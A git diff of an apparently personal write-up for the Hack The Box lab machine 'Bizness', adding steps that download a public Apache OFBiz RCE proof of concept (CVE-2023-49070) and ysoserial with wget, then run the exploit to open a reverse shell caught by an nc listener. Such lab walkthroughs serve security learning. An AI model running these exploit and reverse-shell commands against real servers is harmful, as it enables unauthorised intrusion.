@@ -1,6 +1,12 @@
  
 # Bizness
 
+<p align="center">
+  <img src="https://github.com/MrGovindDubey/HTB-Machines/assets/118271775/b394bd03-e005-41b0-bb83-60f236f052d4" />
+</p>
+
+
+
 Embrace the dawn of a fresh season as we unveil the latest additions to the gaming arena. Welcome to the exhilarating Season 4, where innovation and excitement collide. Leading the charge is the formidable Bizness, a dynamic machine that promises both challenge and reward. Boasting a lucrative 20-point bounty and an accessible easy difficulty level, Bizness beckons all daring adventurers. Without further ado, let's dive headfirst into the world of opportunities and embark on a thrilling journey – it's time to engage in some serious 'bizness'!
 
 
@@ -52,4 +58,19 @@ Further exploration revealed....
 wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
 ```
 
+```bash
+wget https://raw.githubusercontent.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC/main/exploit.py
+```
 
+Now we see that we can execute any command by using the above exploit . So, we try to get reverse shell.
+
+## Executing the Payload
+
+```bash
+python3 exploit.py https://bizness.htb/ shell ip:4444
+```
+
+Subsequently, execute on a second terminal.
+```bash
+nc -lnvp 4444
+```
